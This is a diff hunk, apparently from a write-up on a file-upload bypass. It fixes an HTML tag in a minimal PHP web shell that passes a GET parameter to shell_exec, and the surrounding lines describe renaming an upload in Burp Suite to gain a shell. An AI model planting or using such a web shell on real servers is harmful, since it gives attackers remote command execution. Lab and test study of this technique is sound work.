@@ -22,7 +22,7 @@ Using burp suite, intercept the request for upload of file foo.phpA.jpeg - chang
 	<?php
 	$c = $_GET['c'];
 	$output = shell_exec($c);
-	echo "<pre>$output</pre";
+	echo "<pre>$output</pre>";
 	?>
 	
 and gain access to the shell.
